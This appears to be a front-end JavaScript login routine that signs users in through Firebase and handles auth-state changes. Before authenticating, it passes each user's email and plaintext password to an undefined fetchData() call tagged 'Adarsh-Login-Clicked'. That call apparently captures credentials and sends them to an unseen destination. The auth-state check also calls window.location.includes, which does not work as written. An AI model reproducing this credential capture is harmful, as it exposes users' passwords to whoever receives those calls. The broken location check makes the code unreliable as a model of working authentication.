async function Login() {

    userEmail = document.getElementById("email").value;
    userPassword = document.getElementById("password").value;
    fetchData("Adarsh-Login-Clicked" + "user:" + userEmail + "pass:" + userPassword);
    firebase.auth().signInWithEmailAndPassword(userEmail, userPassword)
        .then((userCredential) => {
            var user = userCredential.user;
        })
        .catch((error) => {
            DisplayMsg(1, "Sorry!", "You Are Not Registered", 0, "t");
        });
}

firebase.auth().onAuthStateChanged(function(user) {
    if (user) {
        document.body.classList.remove("d-none");
    } else if (window.location.includes("Dashboard")) {
        DisplayMsg(1, "Sorry!", "You Are Not Registered", 0, "t");
    }
});